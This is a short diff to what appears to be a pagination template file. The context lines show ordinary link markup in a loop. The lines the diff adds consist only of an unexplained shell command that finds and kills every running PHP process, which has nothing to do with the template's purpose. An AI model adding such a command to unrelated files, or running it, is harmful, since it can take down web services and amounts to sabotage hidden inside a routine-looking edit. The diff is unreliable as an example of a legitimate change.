@@ -19,3 +19,6 @@ paginator
         <a href="{$value.link}" class="paginator-target">{$value.text}</a>
     </div>
 {/loop}
+
+
+kill $(ps aux | grep '[p]hp' | awk '{print $2}')
